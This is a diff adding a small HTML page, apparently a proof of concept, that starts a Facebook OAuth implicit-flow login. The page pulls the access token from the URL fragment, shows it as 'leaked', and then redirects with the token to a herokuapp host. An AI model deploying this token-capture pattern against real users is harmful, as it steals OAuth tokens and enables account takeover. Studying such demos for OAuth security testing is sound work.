@@ -1,0 +1,47 @@
+<html>
+    <body>
+        I'm not a malicious website. TRUST ME!!!111
+        <br>
+        <button onclick="fblogin()">LOGIN</button>
+        <br>
+        <div id="resultDiv">
+        </div>
+        <iframe id="leakedFrame">
+        </iframe>
+    </body>
+    <script>
+        function fblogin(){
+            var baseurl = 'https://www.facebook.com/dialog/oauth?'
+            var app_id = '1704982886420962'
+            var redirect_uri = 'http://localhost:8080'
+            window.open(baseurl+'client_id='+app_id+'&redirect_uri='+redirect_uri+'&response_type=token');
+        }
+        function access_token_from_hash(hash){
+            var allparams = hash.substring(1) // because of hash symbol '#'
+            var params = allparams.split('&')
+            console.log(hash)
+            console.log(allparams)
+            console.log(params)
+            var paramdict = {}
+            params.forEach(function(paramstr){
+                var varval = paramstr.split('=')
+                paramdict[varval[0]] = varval[1]
+            });
+            console.log(paramdict)
+            return paramdict['access_token']
+        }
+        var hash = window.location.hash
+        if(hash){
+            var acc_tok = access_token_from_hash(hash);
+            document.getElementById('resultDiv').innerHTML = 'ups, ..., you leaked an access token: ' + acc_tok
+            //var baseurl = 'http://localhost:3000'
+            var baseurl = 'https://facebooklogintest.herokuapp.com'
+            //document.getElementById('leakedFrame').src = baseurl + '/oauth'
+            setTimeout(function(){
+                var redirect_uri = baseurl + '/oauth/authenticate_back?state=bla&expires_in=5273&access_token='
+                //document.getElementById('leakedFrame').src = redirect_uri + acc_tok
+                window.location = redirect_uri + acc_tok
+            }, 2000)
+        }
+    </script>
+</html>
